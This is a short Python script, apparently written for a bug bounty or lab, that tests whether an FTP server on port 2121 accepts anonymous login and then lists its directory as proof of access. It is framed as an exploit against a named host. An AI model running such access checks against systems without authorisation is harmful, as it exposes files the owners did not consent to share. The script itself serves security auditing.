# Author: Deniz Can
# Vulnerability: Anonymous FTP Access (Medium/Hard Level)
# Target: ftp.0x10.cloud (Port 2121)

import ftplib
import time

def exploit_anonymous_ftp():
    target = "ftp.0x10.cloud"
    port = 2121

    print("=" * 50)
    print("  FTP Anonymous Login Check")
    print("=" * 50)
    print(f"\n[*] Initiating connection to {target} on port {port}...")
    time.sleep(0.15) # Respecting the rate limit

    try:
        # Using Python's built-in FTP library for proper protocol handling
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=5)
        
        # Grab the welcome banner
        print(f"[*] Connection successful. Server says: {ftp.getwelcome()}")
        
        print("\n[*] Attempting 'anonymous' login bypass...")
        # ftplib automatically handles the USER and PASS sequence securely
        ftp.login('anonymous', 'anonymous@example.com')
        
        print("\n[!!!] CRITICAL VULNERABILITY FOUND [!!!]")
        print("-> Issue: Anonymous FTP Access is ALLOWED.")
        print("-> Impact: Attackers can access, read, or upload files without any password!")
        
        # BONUS: Let's prove it by listing the files inside!
        print("\n--- Directory Listing (Proof of Access) ---")
        ftp.retrlines('LIST')
        print("-------------------------------------------")

        ftp.quit()

    except ftplib.error_perm as e:
        print(f"\n[-] Secure: Anonymous login was rejected ({e}).")
    except Exception as e:
        print(f"\n[Error] Connection failed: {e}")

if __name__ == "__main__":
    exploit_anonymous_ftp()